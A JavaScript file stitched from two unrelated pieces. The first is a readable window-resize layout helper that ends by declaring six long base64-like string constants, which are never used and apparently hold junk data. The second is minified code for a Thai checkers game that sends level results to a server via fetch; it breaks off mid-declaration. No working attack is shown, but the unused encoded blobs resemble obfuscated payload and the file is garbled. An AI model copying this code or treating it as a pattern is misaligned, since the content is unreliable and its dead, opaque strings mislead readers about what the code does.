"use strict";
function windowResize(
  W, H, pW, pH, 
  cfg, 
  breakpoints, 
  pixelRatio, 
  theme, 
  elemRegistry, 
  constraints, 
  onLayoutChange, 
  onCriticalReflow, 
  memoCache
) {
  const ASPECT_RATIO = W / H;
  const DELTA_X = W - pW;
  const DELTA_Y = H - pH;
  const IS_LANDSCAPE = W > H;
  const SCALE_V = W / (cfg.baseWidth || 1920);
  const SCALE_H = H / (cfg.baseHeight || 1080);
  
  const _getBP = (w) => {
    const keys = Object.keys(breakpoints);
    for (let i = keys.length - 1; i >= 0; i--) {
      if (w >= breakpoints[keys[i]]) return keys[i];
    }
    return 'xs';
  };

  const _math = {
    clamp: (v, min, max) => Math.min(Math.max(v, min), max),
    lerp: (a, b, t) => a + (b - a) * t,
    precision: (v, p = 2) => parseFloat(v.toFixed(p)),
    getSafeBound: (val, limit) => val > limit ? limit : val
  };

  const curBP = _getBP(W);
  const prevBP = _getBP(pW);

  const computeGrid = (cols, gutter) => {
    const activeGutter = W < 768 ? gutter / 2 : gutter;
    const netWidth = W - (activeGutter * 2);
    const colWidth = (netWidth - (activeGutter * (cols - 1))) / cols;
    return {
      cw: _math.precision(colWidth),
      gt: activeGutter,
      nw: netWidth
    };
  };

  const resolveTypography = () => {
    const base = theme.fontSize || 16;
    const factor = W < 600 ? 0.85 : W > 1600 ? 1.25 : 1;
    return {
      h1: _math.precision(base * 2.5 * factor),
      body: _math.precision(base * factor),
      lineHeight: _math.precision(1.5 * factor)
    };
  };

  const evaluateVisibility = (registry) => {
    return registry.map(item => {
      const isHidden = item.minW > W || item.minH > H;
      const adaptiveSize = item.fluid ? W * item.ratio : item.baseSize;
      return {
        id: item.id,
        visible: !isHidden,
        rect: {
          w: _math.clamp(adaptiveSize, item.min || 0, item.max || W),
          h: item.autoHeight ? 'auto' : H * (item.vRatio || 0.1)
        }
      };
    });
  };

  const calculateSafeZones = (inset) => {
    const horizontal = _math.clamp(W * inset, 10, 100);
    const vertical = _math.clamp(H * inset, 10, 100);
    return {
      top: vertical,
      bottom: vertical,
      left: horizontal,
      right: horizontal
    };
  };

  const processTransformations = () => {
    const perspective = _math.precision(W * 1.5);
    const zTranslate = curBP === 'xl' ? 100 : 0;
    return `perspective(${perspective}px) translateZ(${zTranslate}px)`;
  };

  const getEnginePayload = () => {
    const grid = computeGrid(cfg.columns || 12, cfg.gutter || 20);
    const typo = resolveTypography();
    const views = evaluateVisibility(elemRegistry);
    const safe = calculateSafeZones(constraints.inset || 0.05);

    return {
      meta: {
        bp: curBP,
        pBp: prevBP,
        dpr: pixelRatio,
        orientation: IS_LANDSCAPE ? 'L' : 'P'
      },
      metrics: {
        vw: W,
        vh: H,
        ar: _math.precision(ASPECT_RATIO),
        dx: DELTA_X,
        dy: DELTA_Y
      },
      layout: {
        grid,
        typo,
        views,
        safe,
        transform: processTransformations()
      }
    };
  };

  const payload = getEnginePayload();

  if (curBP !== prevBP) {
    onCriticalReflow(payload);
  } else if (Math.abs(DELTA_X) > 50 || Math.abs(DELTA_Y) > 50) {
    onLayoutChange(payload);
  }

  const syncCache = (key, data) => {
    memoCache[key] = {
      ts: Date.now(),
      data: data,
      hash: `${W}x${H}`
    };
  };

  syncCache('last_render', payload);

  const N4 = "Mzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MQ3NTkyMzg0NzU5jM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT";
  const N5 = "IzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjMIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzzODQ3NM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5Mj";
  const N6 = "M4NDc1OTIzODQ3NTkyMzg0NzUPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr85MjM4NDc1OTIzODQ3NTkyMzgPMxsvmSAYtFecNLcMqVgdCiywDUmW3p4FdFsvo4ujaHS9n8NTO4DXjznIcPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr8hXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr84";
  const N7 = "Mzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMz0Dc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT";
  const N8 = "IzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjOTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5Mj";
  const N9 = "M4NDc1OTIzODQ3NTkyMzg0NzUPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr85MjM4NDc1OTIzODQ3NTkyMzgPMxsvmSAYtFecNLcMqVgdCiywDUmW3p4FdFsvo4ujaHS9n8NTO4DXjznIcPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr8hXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr84";
  
  return {
    state: payload,
    next: {
      pW: W,
      pH: H,
      pBP: curBP
    },
    utils: {
      rebase: (val) => val * SCALE_V,
      vRebase: (val) => val * SCALE_H
    }
  };
}

///////////////////////////////

"use strict";let t=1,n=t,e=10;let a=0,i=0,r=0,o="",c="",l=0,f=0;let s=0,u=0,w=0,h=0,d=0,p=0;const g=new Int32Array([5,1,5,1,5,1,5,1,1,5,1,5,1,5,1,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,0,5,0,5,0,5,0,0,5,0,5,0,5,0,5]),y=new Int32Array([5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5]),m=new Int32Array([0,0,0,0,0,0,0,0,8,0,29,0,29,0,29,0,0,16,0,16,0,16,0,6,4,0,5,0,5,0,5,0,0,2,0,9,0,7,0,6,1,0,6,0,6,0,6,0,0,3,0,4,0,4,0,3,0,0,9,0,7,0,6,0]),v=new Int32Array([0,0,0,0,0,0,0,0,8,0,29,0,29,0,29,0,0,16,0,16,0,16,0,11,15,0,10,0,10,0,10,0,0,6,0,6,0,6,0,7,4,0,3,0,3,0,3,0,0,1,0,1,0,1,0,2,0,0,0,0,0,0,0,0]);let M=new Int32Array(m);const b=new Int32Array([-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,-1,-1,8,9,10,11,12,13,14,15,-1,-1,16,17,18,19,20,21,22,23,-1,-1,24,25,26,27,28,29,30,31,-1,-1,32,33,34,35,36,37,38,39,-1,-1,40,41,42,43,44,45,46,47,-1,-1,48,49,50,51,52,53,54,55,-1,-1,56,57,58,59,60,61,62,63,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]),x=new Int32Array([21,22,23,24,25,26,27,28,31,32,33,34,35,36,37,38,41,42,43,44,45,46,47,48,51,52,53,54,55,56,57,58,61,62,63,64,65,66,67,68,71,72,73,74,75,76,77,78,81,82,83,84,85,86,87,88,91,92,93,94,95,96,97,98]),k=new Int32Array([-11,-9,11,9]),A=new Int32Array([1,3,5,7,8,10,12,14,17,19,21,23,24,26,28,30,33,35,37,39,40,42,44,46,49,51,53,55,56,58,60,62]),I=(new Int32Array([62,60,58,56,55,53,51,49,46,44,42,40,39,37,35,33,30,28,26,24,23,21,19,17,14,12,10,8,7,5,3,1]),new Int32Array(64).fill(-1));let _,C,L,R,S=0,E=1,B=0,D=0,P=0,N=!1,W=!1;let H=100,T=190,U=190;let j=new Int32Array(256),F=new Int32Array(64),Y=new Int32Array(64),X=new Int32Array(256),z=new Int32Array(64),J=new Int32Array(64);let $=new Int16Array(4096);const q=(t,n)=>(t<<6)+n;let K=new Array(64),Z=new Array(64);function G(){wn&&0!==wi&&0!==Ri?(fetch(Na+"level=SL0219&result="+wi+"&moves="+Ri),V(),O(),Sn("by Jaroonsak Wangviwat")):setTimeout(G,200)}async function O(){var e;if(W=!0,r=performance.now(),i++,Sa=-9999,L=!(1&i),o="",S=0,E=1,a=0,B=0,D=0,R=0,P=0,_=0,Z[0]=0,F[0]=0,M.set(m),H=100,T=190,U=190,H+=rt(-5,0,5),U+=rt(-5,0,5),T+=rt(10,20,30),M[30]+=rt(0,1,2),M[33]+=rt(0,1,2),M[39]+=rt(0,1,2),M[40]+=rt(0,1,2),M[35]+=rt(0,-3,-6),M[rt(49,51,53)]+=4,function(){for(let t=0;t<4194304;t++)ei[t]=0,ai[t]=0,ii[t]=0,ri[t]=0,oi[t]=0,ci[t]=0;Qa=0,Va=0,ti=0,ni=0}(),vn(),Ut=!1,jt=-1,Ft=-1,Fe=Ye=0,qe=!1,await async function(){if(1===Tt)return;const n=Xt,e=ne*n,a=Ht[Tt][Ln(1)],i=(Ht[Tt][Ln(0)],Ht[ft][0===t?6:3]),r=Fn[rt(0,1,2)];fe(i),await se(i,ae,ie);const o=3*Xt,c=2*-Xt;re=o-ce,oe=c-le,await ue(20,o,c);const l=[],f=[],s=[],u=[];for(let t=63;t>=0;t--){const n=y[t];1!==n&&3!==n||f.push(t),0!==n&&2!==n||l.push(t)}for(let t=Yn;t>=0;t--)4!==Kn[t]&&s.push(t),4!==qn[t]&&u.push(t);await Promise.all([(async()=>{for(let t of l){const i=fa(t)*n,r=sa(t)*n;await Hn(200,i,r,e/3,a),await Da(),In(4,t)}for(let t=0;t<l.length;t++){const i=r[t],o=fa(i)*n,c=sa(i)*n;await Un(200,o,c,e/3,a,Ae),await Da(),In(1,i)}if(dn&&s.length>0)for(let t of s){const i=Jn[t]*n,r=$n[t]*n;await ue(20,i,r,e/3,a),Kn[t]=4,await Cn(1)}for(let t=l.length;t<8;t++){const i=r[t],o=fa(i)*n,c=sa(i)*n;await Un(200,o,c,e/3,a,Ae),await Da(),In(1,i)}await ue(200,o,c,0)})(),(async()=>{await Da(1e3);for(let t of f)In(4,t),await Da();for(let t=0;t<f.length;t++)In(0,A[31-t]),await Da();if(dn&&u.length>0)for(let t of u)qn[t]=4,await Cn(0),await Da(200);for(let t=f.length;t<8;t++)In(0,A[31-t]),await Da(200)})()])}(),function(){let t,n;for(let e=0;e<Yn;e++)Jn[e]=Zn+e%3*.7+ot(.3),$n[e]=Gn+e%3/3+.7*Math.floor(e/3)+ot(.3),Kn[e]=4,t=2-e%3,n=2-Math.floor(e/3),Xn[e]=On+.7*t+ot(.3),zn[e]=Qn+t/3+.7*n+ot(.3),qn[e]=4}(),y.set(g),ha(wa),kn(),An(),Sn("Jaihorse makhos.com"),e="x4sl level "+t,At.textContent=e,En(!1),bn(),Et.textContent=" ",Bt.textContent=" ",await tt("Level "+t,500),0===t&&0===n&&(await tt("ต่อให้",250),await async function(){if(1===Tt)return;const t=Xt,n=ne*t,e=Ht[ft][6];fe(e),await se(e,ae,ie);const a=3*Xt,i=2*-Xt;if(re=a-ce,oe=i-le,await ue(20,a,i),it(.6)){const e=rt(8,10,12),r=y[e],o=Ht[Tt][Ln(r)];if(4===r)return;let c;do{c=rt(8,10,12)}while(c===e);const l=fa(c)*t,f=sa(c)*t,s=fa(e)*t,u=sa(e)*t,w=Math.random();w<.3&&(await ue(200,s,u,n),await we(300,s,u)),w<.6&&(await ue(200,l,f,n),await we(300,l,f)),await ue(200,s,u,n),await Da(),In(4,e),await Hn(300,a,i,-n,o),y[e]=4}else{const e=rt(58,60,62),r=y[e],o=Ht[Tt][Ln(r)];if(4===r)return;const c=fa(e)*t,l=sa(e)*t;await Un(300,c,l,n,o,Ae),In(2,e),await Da(),await ue(360,a,i),y[e]=2}}(),An(),await Q(500)),Ua=ja=180,Ja(0===S),Xa(),Dn(!0),await tt(L?"คุณเดินหลัง":"คุณเดินก่อน",250),L){const t=14,n=21,e=t|n<<8;await Wn(e),y[n]=y[t],y[t]=4,An()}!function(){s=u=w=h=0;let t=0;for(let n=0;n<32;n++){const e=A[n],a=y[e];if(4!==a)switch(t++,a){case 0:s++;break;case 1:u++;break;case 2:w++;break;case 3:h++}}d=t}(),Yt=window.devicePixelRatio||1,mn(pt,tn,nn),mn(yt,en,an),mn(vt,en,an),Mt.imageSmoothingEnabled=!1,xt.imageSmoothingEnabled=!1,gn(),W=!1}async function Q(t){const n=performance.now();for(let t=0;t<Ht[ft].length;t++){const n=Ht[ft][t];se(n,n.width,n.height),xt.clearRect(0,0,n.width,n.height)}for(;performance.now()-n<t;)await he(16,t=>{de(0,0)});await Da()}function V(){y.fill(5);for(let t=0;t<32;t++)y[A[t]]=4;Cn(),An()}async function tt(t,n){et(),await Q(n),nt(t),await Q(2*n),et(),await Q(n)}function nt(t){Dt.textContent=t,Dt.classList.add("show")}function et(){Dt.classList.remove("show")}function at(){p=1e3*w+100*s+10*h+u}function it(t){return Math.random()<t}function rt(t,n,e){const a=Math.random();return a<.3?t:a<.7?n:e}function ot(t,n=.25){return t*(1+(2*Math.random()-1)*n)}function ct(t){return(2*Math.random()-1)*t}const lt=[["mLPWN256_128.png","mDPWN256_128.png","mLHRS256_128.png","mDHRS256_128.png","brddrk160.jpg","brdwht160.jpg","mL_ico.png","mD_ico.png","selBlack.png","selWhite.png"],["wLPWN256r_64.png","wDPWN256r_64.png","wLHRS256r_64.png","wDHRS256r_64.png","wEMPTY.png","wNOUSE.png","wL_ico.png","wD_ico.png","selBlack.png","selBlack.png"],["cLPWN256_64.png","cDPWN256_64.png","cLHRS256_64.png","cDHRS256_64.png","cBDRK.jpg","cBWHT.jpg","cL_ico.png","cD_ico.png","selBlack.png","selBlack.png"],["handMov1_64.png","handMov2_64.png","handCap1_64.png","handCap2_64.png","handCapW_64.png","girlMov3_64.png","girlCap3_64.png"]],ft=3,st=lt.length;let ut,wt,ht,dt,pt,gt,yt,mt,vt,Mt,bt,xt,kt,At,It,_t,Ct,Lt,Rt,St,Et,Bt,Dt,Pt,Nt=document,Wt=!0,Ht={},Tt=0,Ut=!1,jt=-1,Ft=-1,Yt=1,Xt=1,zt=0,Jt=0,$t=new Int16Array(64),qt=new Int16Array(64),Kt=[],Zt=[],Gt=0;function Ot(t){return Nt.getElementById(t)}let Qt,Vt,tn,nn,en,an,rn,on,cn,ln,fn,sn,un,wn=!1;function hn(){pn(),pt.addEventListener("pointerdown",t=>{if(t.preventDefault(),W)return;if(3===a)return Ke();if(0!==a)return;const n=ta(t.clientX,t.clientY);n<0||Ut&&Qe(n)||function(t){if(!Oe(t))return!1;Ut=!0,jt=t,Ze.length=0;for(let n=0;n<Y[0];n++)ia(j[n])===t&&Ze.push(ra(j[n]));return async function(t){const n=y[t],e=Xt,a=fa(t)*e,i=sa(t)*e;Rn(),0===la(n)&&Mt.drawImage(Ht[Tt][9],a,i,e,e),1===la(n)&&Mt.drawImage(Ht[Tt][8],a,i,e,e)}(t),!0}(n)&&(function(t,n){Ue=t,je=y[t],Xe=n.clientX,ze=n.clientY,Je=fa(t)*Xt,$e=sa(t)*Xt,pt.setPointerCapture(n.pointerId),Rn(),Se(Me)}(n,t),Ge=-1,1===Y[0]&&(Ge=ra(j[0])))},{passive:!1}),pt.addEventListener("pointermove",t=>{if(t.preventDefault(),!(Ue<0)){if(!Te){if(Math.abs(t.clientX-Xe)+Math.abs(t.clientY-ze)<2)return;Te=!0,In(4,Ue)}!function(t){const n=pt.getBoundingClientRect();Fe=(t.clientX-n.left)*(pt.width/n.width),Ye=(t.clientY-n.top)*(pt.height/n.height)}(t),function(){ge&&me();const t=Math.round(Fe-Xt/2)+zt,n=Math.round(Ye-Xt/2)+Jt,e=Ht[Tt][Ln(je)+0];pe(e,t,n),Je=t,$e=n;const a=aa(Fe,Ye);if(a>=0){const t=fa(a)*Xt+zt,n=sa(a)*Xt+Jt;Mt.globalAlpha=.1,pe(e,t,n),Mt.globalAlpha=1}}()}}),pt.addEventListener("pointerup",async t=>{if(t.preventDefault(),W)return ea(),void Rn();pt.releasePointerCapture(t.pointerId),qe=Te,ea(),Rn();let n=ta(t.clientX,t.clientY);n<0||qe&&!Qe(n)?An():Ut&&Qe(n)?await async function(t){if(!Ut)return;let n=-1;for(let e=0;e<Y[0];e++)if(ia(j[e])===jt&&ra(j[e])===t){n=e;break}if(n<0)return Oe(t)&&(jt=t),An(),void(W=!1);await async function(t){W=!0;const n=j[t],e=(ia(n),ra(n));ca(n),qe?await Wn(n,Je,$e):await Wn(n),_a(n),R=n,P=e,Ve(n),0===ca(R)&&2===y[e]?D++:D=0,Ut=!1,a=2,Sn("Sunhorse กำลังคิด.."),An(),za(),await Da(20),await async function(){for(Bn(!1);;){let t="";B++,_=0,ha(wa);let n=0;if(K[0][0]=0,La=0,Ra=0,0===Y[0]){Wa(1);break}if(1===Y[0]&&(n=j[0],await Da(20)),B<4&&0===n&&(n=Pa(),0!==n&&(t+="...",await Da(500))),B>3&&0===n&&it(.85)){const e=Pi();e&&(n=e,t+="..",await Da(500))}if(0===n){if(!1===await Ea()){Wa(1);break}n=K[0][0]}if(524288&j[0]||(W=!0,An(),await Wn(n),W=!1),_a(n),R=n,Ve(n),524288&R||(P=ra(n)),0===ca(R)&&3===y[ra(R)]){if(D++,Ha()){Wa(0);break}}else D=0;if(An(),t="ตาคุณเดิน"+t,B++,_=0,ha(wa),!(524288&j[0])){if(0===Y[0]){Wa(-1);break}if(Y[0]>=1){let n=ia(j[0]);for(let t=1;t<Y[0];t++)if(ia(j[t])!==n){n=-1;break}if(n>=0){jt=n,Ut=!0,a=0,Sn(t),An();break}}a=0,Ut=!1,Sn(t);break}_a(524288),R=524288,_=0,ha(wa)}0===a&&(Bn(!0),Ja(!0),Xa(),Fa&&clearInterval(Fa),Fa=setInterval(()=>{Ua>0&&Ua--,Xa()},1e3))}(),An(),W=!1}(n)}(n):An()}),pt.addEventListener("pointercancel",na),pt.addEventListener("pointerleave",na),Lt.addEventListener("click",He),Rt.addEventListener("click",xn),_t.addEventListener("click",Mn),St.addEventListener("click",()=>{W||(Wa(-1),Ke())}),window.addEventListener("resize",pn)}let dn=!0;function pn(){Yt=window.devicePixelRatio||1,Qt=innerWidth,Vt=innerHeight;const t=Math.min(8*Qt/8.25,8*Vt/9.5);cn=Math.floor(t/8),Xt=cn*Yt,tn=8*cn,nn=8*cn,rn=Math.floor(.8*cn),on=Math.floor(.65*cn),en=Math.min(Qt,18*cn),an=Math.min(Vt,nn+rn),yn(ut,tn,nn),yn(wt,en,an),yn(ht,tn,rn),yn(dt,tn,on),mn(pt,tn,nn),mn(yt,en,an),mn(vt,en,an),ln=(Qt-tn)/2|0,fn=rn,sn=(Qt-en)/2|0,un=0,zt=(en-tn)/2*Yt,Jt=fn*Yt,dn=Qt-tn>cn,Pt.style.fontSize=.5*cn+"px",kt.style.fontSize=.3*cn+"px",vn(),gn()}function gn(){kn(),An(),bn(),pt.style.boxShadow="0 0 2px 2px #333"}function yn(t,n,e){t.style.width=n+"px",t.style.height=e+"px"}function mn(t,n,e){t.width=n*Yt,t.style.width=n+"px",t.height=e*Yt,t.style.height=e+"px"}function vn(){let n=.05;0===t&&(n=.08),i<2&&(n=0);for(let t=0;t<64;t++)Kt[t]=ct(n),Zt[t]=ct(n);!function(){const t=Xt;for(let n=0;n<64;n++)$t[n]=Math.round((fa(n)+Kt[n])*t),qt[n]=Math.round((sa(n)+Zt[n])*t)}()}function Mn(){Tt=(Tt+1)%3,bn(),kn()}function bn(){_t.src=lt[Tt%3][L?6:7],Ct.src=lt[Tt%3][L?7:6],An()}function xn(){Wt=!Wt,cellNumSwitch.classList.toggle("off",!Wt),kn()}function kn(){const t=Xt,n=.03*t;gt.font=(.15*t|0)+"px Arial",gt.fillStyle="#A98",gt.textAlign="right",gt.textBaseline="top";for(let e=0;e<64;e++){const a=fa(e),i=sa(e),r=a+i&1,o=Ht[Tt][r?4:5];if(gt.drawImage(o,a*t,i*t,t,t),r&&Wt&&cn>36){const r=I[L?63-e:e];gt.fillText(r,a*t+t-n,i*t+n)}}}function An(t=!0){mt.clearRect(0,0,yt.width,yt.height),Rn();for(let t=0;t<64;t++){const n=y[t];n<0||n>3||In(n,t)}if(Cn(),t&&Ut){const t=Xt,n=jt,e=Ln(y[n]),a=Ht[Tt][0===la(e)?9:8];Mt.drawImage(a,fa(n)*t+zt,sa(n)*t+Jt,t,t)}}function In(t,n){if(4===t)!function(t){const n=Xt,e=fa(t)*n+zt,a=sa(t)*n+Jt,i=.2*n;mt.clearRect(e,a-i,n,n+2*i),mt.clearRect(e-i,a,n+2*i,n)}(n);else{_n(Ht[Tt][Ln(t)],$t[n]+zt,qt[n]+Jt)}}function _n(t,n,e){t&&mt.drawImage(t,n,e,Xt,Xt)}function Cn(t=null){if(1!==Tt&&dn){!function(t=null){const n=3*Xt,e=3.5*Xt,a=zt+Zn*Xt,i=Jt+Gn*Xt,r=zt+On*Xt,o=Jt+Qn*Xt;null!==t&&1!==t||mt.clearRect(a,i,n,e);null!==t&&0!==t||mt.clearRect(r,o,n,e);!function(t=null){const n=Xt;mt.save(),mt.lineWidth=.03*n,mt.strokeStyle="rgba(200,200,200,0.1)",(null===t||1===t)&&mt.strokeRect(zt-3*n,Jt+0*n,2*n,2*n);null!==t&&0!==t||mt.strokeRect(zt+9*n,Jt+6*n,2*n,2*n);mt.restore()}(t)}(t);for(let n=0;n<Yn;n++){const e=Kn[n],a=qn[n];null!==t&&1!==t||4===e||_n(Ht[Tt][e],Jn[n]*Xt+zt,$n[n]*Xt+Jt),null!==t&&0!==t||4===a||_n(Ht[Tt][a],Xn[n]*Xt+zt,zn[n]*Xt+Jt)}}}function Ln(t){return L||4===t||5===t?t:1^t}function Rn(){Mt.clearRect(0,0,vt.width,vt.height)}function Sn(t){kt.textContent=t}function En(t){St.style.visibility=t?"visible":"hidden"}function Bn(t){St.classList.toggle("disabled",!t)}function Dn(t){Rt.style.display=t?"inline":"none",Lt.style.display=t?"inline":"none"}let Pn,Nn;async function Wn(n,e=null,a=null){const i=ia(n),r=ra(n),o=ca(n),c=y[i],l=1===la(c)&&1!=Tt,f=Xt;ge=null;const s=0!=(131072&o),u=0!=(262144&o),w=$t[i],h=qt[i],d=$t[r],p=qt[r],g=Ht[Tt][Ln(c)+0];Ht[Tt][4];if(!l){In(4,i);const t=e??w+zt,l=a??h+Jt,f=d+zt,u=p+Jt;if(await async function(t,n,e,a,i,r){await he(t,t=>{const o=Math.round(n+(a-n)*t),c=Math.round(e+(i-e)*t);pe(r,o,c)})}(1===S?200:60,t,l,f,u,g),Se(0===o?Ae:ke),In(c,r),s){const t=jn(n),e=y[t];fa(t),sa(t),Ht[Tt][Ln(e)+0];await Da(),In(4,t);const a=Vn(0);if(null!=a&&null!=a.idx){const{idx:t,x:n,y:i}=a;te(S,t,Ln(e)),await Da(200),Cn()}}return}const m=!s&&!u&&1===c,v=t>1||Sa>150,M=t>0&&it(Math.min((Sa-150)/450,.5)),b=La>0?ia(La):-1,x=La>0?ra(La):-1,k=i>=24;let A,I=1;0===t?(I=1.2,A=m?5:6):A=u?3:3===c&&0===Tt?4:s?k?3:2:M?3:k?0:1;const _=m&&!v&&B>6,C=m&&v,L=_&&b===i&&x!==r,R=_&&b!==i,E=Ht[ft][A];fe(E);const D=ne*f,P=w,N=h,W=d,H=p;await se(E,ae,ie),Pn=fa(r)/2*f,Nn=-ie-.2*f,re=Pn-ce,oe=Nn-le,await ue(20,Pn,Nn);const T=P+Math.round(ct(.05)*f),U=N+Math.round((3===c||s?.1:-.1)*f);if(R){const t=fa(b)*f,n=sa(b)*f,e=(t+Pn)/2,a=(n+Nn)/2;await ue(300*I,t,n),await we(300,t,n),await ue(300*I,e,a,D),await we(300,e,a)}if(s?await ue(200,P,N):(await ue(300*I,T,U,i<16?-D/2:0),_&&it(.1)&&await we(300,T,U),await Da(20),await ue(60,P,N),await Da(60*(1+Math.random()))),In(4,i),L){const t=fa(x)*f,n=sa(x)*f;await async function(t,n,e,a,i){const r=ot(.5),o=e+(t-e)*r,c=a+(n-a)*r;await Tn(300,o,c,i),await Da(),await Tn(300,e+.1*Xt,a+.1*Xt,i),await Da()}(t,n,w,h,g)}if(s?await Un(300*I,W,H,D,g,ke):M?await async function(t,n,e){const a=ne*Xt,i=rt(.5,1,1.5);await Tn(300,t,n-.2*Xt,e),await Un(200*i,t,n,a*i,e,ke),await Da()}(W,H,g):_&&it(.1)?await async function(t,n,e,a,i){const r=Math.round(ct(.2*Xt)),o=Math.round(ct(.3*Xt)),c=a+r,l=i+o,f=t+r,s=n+o,u=(Pn+t)/2,w=(Nn+n)/2;await Tn(300,f,s,e),await ue(200,u,w,0,e,c,l),await ue(200,f,s,0,e,c,l),await Tn(200,t,n,e,xe),await Da()}(W,H,g,d,p):C&&it(.3)?await async function(t,n,e){await ue(200,t,n+.1*Xt,0,e,null,null,null,be),await ue(60,t,n,0,e,null,null,null,xe),await Da()}(W,H,g):C&&it(.5)?await async function(t,n,e){const a=ne*Xt;await Tn(200,t,n,e),it(.5)&&await ue(60,t,n-.1*Xt,a/2,e,t,n);await ue(60,t,n,a/3,e,t,n),await Da()}(W,H,g):(await Tn(300*I,W,H,g),await Da()),In(c,r),m&&r>24&&it(.2)){const t=r-16,n=y[t];if(0===n||1===n){const e=$t[t],a=qt[t],i=Ht[Tt][Ln(n)+0];In(4,t),await async function(t,n,e){const a=ne*Xt,i=t+Math.round(ct(.3*Xt)),r=n-Math.round(.3*Math.random()*Xt);await ue(60,(i+Pn)/2,(r+Nn)/2,0,e,i,r),await Da(),await ue(200,i,r,a,e,i,r),await Da(),await Tn(200,t,n,e,xe),await Da()}(e,a,i),In(n,t)}}if(s){const t=jn(n),e=y[t],a=fa(t)*f,i=sa(t)*f,r=Ht[Tt][Ln(e)+0];await ue(200*I,a,i,D),await Da(),In(4,t);const o=Vn(1);if(null!=o&&null!=o.idx){const{idx:t,x:n,y:a}=o;await Un(200,n,a,D/3,r),te(1,t,Ln(e)),Cn(),await Da()}await ue(200*I,2*-f,Nn)}else await ue(200*I,Pn,Nn);if(u){const t=Ht[Tt][Ln(1)];await Un(200*I,W,H,0,t,Ae),await Da(),In(3,r),await ue(200*I,Pn,Nn)}}async function Hn(t,n,e,a=0,i,r=Me){await ue(t,n,e,a,i,null,null,r)}async function Tn(t,n,e,a,i=be){await ue(t,n,e,0,a,null,null,null,i)}async function Un(t,n,e,a=0,i,r=null){await ue(t,n,e,a,i,null,null,null,null,r)}function jn(t){if(!(131072&t))return-1;const n=ia(t),e=ra(t);return n>e?fa(n)>fa(e)?e+9:e+7:fa(n)>fa(e)?e-7:e-9}const Fn=[[1,3,5,7,14,12,10,8],[7,14,5,12,3,10,1,8],[14,12,10,8,1,3,5,7]];const Yn=8;let Xn=new Array(Yn),zn=new Array(Yn),Jn=new Array(Yn),$n=new Array(Yn),qn=new Array(Yn).fill(4),Kn=new Array(Yn).fill(4);const Zn=-3.5,Gn=-.5,On=8.5,Qn=4.5;function Vn(t){const n=0===t?qn:Kn,e=0===t?Xn:Jn,a=0===t?zn:$n,i=[];for(let t=0;t<Yn;t++)4===n[t]&&i.push(t);if(!i.length)return null;const r=i[Math.random()*i.length|0];return{idx:r,x:e[r]*Xt,y:a[r]*Xt}}function te(t,n,e){return n<0?-1:(1===t?Kn[n]=e:qn[n]=e,n)}const ne=2;let ee=1,ae=0,ie=0,re=0,oe=0,ce=0,le=0;function fe(t){ee=11*Xt/t.height,ae=t.width*ee,ie=11*Xt,ce=Math.round(400*ee),le=Math.round(ie-150*ee)}async function se(t,n,e){return bt.width=n,bt.height=e,xt.clearRect(0,0,n,e),xt.drawImage(t,0,0,n,e),bt}async function 